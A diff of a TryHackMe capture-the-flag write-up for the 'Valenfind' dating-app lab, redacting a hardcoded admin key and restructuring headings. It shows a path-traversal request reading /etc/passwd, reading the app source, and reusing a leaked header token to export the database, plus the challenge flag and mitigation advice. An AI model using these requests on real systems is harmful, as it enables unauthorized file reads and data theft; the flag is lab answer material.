@@ -1,20 +1,24 @@
 ---
-
-platform: TryHackMe
-room: Love at First Breach 2026 — Valenfind
+type: resource-note
+status: done
+created: 2026-02-15
+updated: 2026-03-12
+tags: [security-writeup, tryhackme, event, web-research]
+source: TryHackMe - Love at First Breach 2026 - Valenfind
+platform: tryhackme
+room: Love at First Breach 2026 - Valenfind
 slug: valenfind
 path: TryHackMe/90-events/love-at-first-breach-2026/valenfind.md
-topic: 10-web
-domain: [web, vuln-research]
-skills: [burp-suite, lfi-path-traversal, source-review]
+topic: 90-events
+domain: [web]
+skills: [burp-suite, lfi-path-traversal, source-analysis]
 artifacts: [lab-notes, pattern-card]
-status: done
-date: 2026-02-15
+sanitized: true
 ---
 
-# Valenfind — Can you find vulnerabilities in this new dating app?
+# Love at First Breach 2026 - Valenfind
 
-## 0) Summary
+## Summary
 
 * Target: a web app on port `5000` (Flask-like stack inferred from the `Server` header).
 * Primary bug class: **Local File Inclusion / Path Traversal** via a template/layout fetch endpoint.
@@ -25,28 +29,28 @@ Flag:
 
 * `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`
 
-## 1) Key Concepts (plain language)
+## Key Concepts
 
 * Local File Inclusion (LFI, 本地文件包含): the server reads a file path influenced by user input.
 * Path Traversal (目录穿越): using `../` to escape an intended directory and reach arbitrary files.
 * Source-assisted exploitation: once you can read server files, reading the main app code often reveals secrets, internal routes, and data paths.
 * Header-based “auth”: a route protected only by a static header value (API key) is fragile when the key can be leaked.
 
-## 2) Observations from the UI & traffic
+### 2) Observations from the UI & traffic
 
 * The challenge provides a target URL (sanitized here as `http://TARGET_HOST:5000`).
 * I proxied the browser through Burp Suite and interacted with the site (signup and profile browsing).
 * A notable clue appears in the `cupid` profile page JavaScript: the theme/layout loader calls an API endpoint with a user-controlled `layout` parameter.
 
-## 3) Attack Surface Mapping
+### 3) Attack Surface Mapping
 
-### 3.1 Service fingerprint
+#### 3.1 Service fingerprint
 
 * Port `5000` responds with a server fingerprint:
 
   * `Server: Werkzeug/3.0.1 Python/3.12.3`
 
-### 3.2 Theme/layout fetching endpoint
+#### 3.2 Theme/layout fetching endpoint
 
 The client-side code calls:
 
@@ -70,9 +74,9 @@ And includes a comment explicitly pointing to an LFI risk:
 13 }
 ```
 
-## 4) Exploitation Notes
+### 4) Exploitation Notes
 
-## 4.1 Confirm LFI / path traversal
+### 4.1 Confirm LFI / path traversal
 
 I sent the API request to Burp Repeater and tested traversal.
 
@@ -81,7 +85,7 @@ Example request (sanitized):
 ```http
 01 GET /api/fetch_layout?layout=../../../../etc/passwd HTTP/1.1
 02 Host: TARGET_HOST:5000
-03 User-Agent: <REDACTED>
+03 User-Agent: VALUE_REDACTED
 04 Accept: */*
 05 Connection: close
 ```
@@ -90,7 +94,7 @@ Result:
 
 * The response returned `/etc/passwd` content, confirming server-side file read.
 
-## 4.2 Read app source for pivots
+### 4.2 Read app source for pivots
 
 Next, I attempted to read the main application source:
 
@@ -105,7 +109,7 @@ This succeeded via the same endpoint:
 04 Connection: close
 ```
 
-## 4.3 Identify the admin database export route
+### 4.3 Identify the admin database export route
 
 From `app.py`, an admin export endpoint was revealed:
 
@@ -113,22 +117,22 @@ From `app.py`, an admin export endpoint was revealed:
 
 It checks a custom header:
 
-* `X-Valentine-Token: <ADMIN_API_KEY>`
+* `X-Valentine-Token: API_KEY_REDACTED`
 
 The code also contained a hardcoded key value:
 
-* `ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"`
+* `ADMIN_API_KEY = "API_KEY_REDACTED"`
 
 (Any session cookies observed in Burp are omitted here; they are not required to document the core bug chain.)
 
-## 4.4 Export database and extract flag
+### 4.4 Export database and extract flag
 
 Using Burp Repeater, I sent:
 
 ```http
 01 GET /api/admin/export_db HTTP/1.1
 02 Host: TARGET_HOST:5000
-03 X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
+03 X-Valentine-Token: API_KEY_REDACTED
 04 Accept: */*
 05 Connection: close
 ```
@@ -140,7 +144,7 @@ Result:
 
   * `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`
 
-## 5) Pattern Cards (generalizable)
+## Pattern Cards
 
 ### Pattern A — “Template fetch” + user-controlled path
 
@@ -174,7 +178,7 @@ Defender fix (high level):
 * Rotate leaked keys.
 * Add real authentication/authorization (server-side identity), not just “a magic header value”.
 
-## 6) Mitigation / Recommendations
+## Mitigation / Recommendations
 
 * LFI/Traversal:
 
@@ -190,13 +194,13 @@ Defender fix (high level):
   * Restrict `/api/admin/*` to authenticated admins.
   * Add rate limiting and audit logging (especially for export/backup endpoints).
 
-## 7) Evidence (sanitized)
+## Evidence
 
 * Observed header: `Server: Werkzeug/3.0.1 Python/3.12.3`.
 * Confirmed LFI via `/api/fetch_layout?layout=...`.
 * Read source file: `/opt/Valenfind/app.py`.
 * Found admin export endpoint: `/api/admin/export_db`.
-* Found static header token: `X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO`.
+* Found static header token: `X-Valentine-Token: API_KEY_REDACTED`.
 * Extracted flag: `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`.
 
 ## 8) CN–EN Glossary
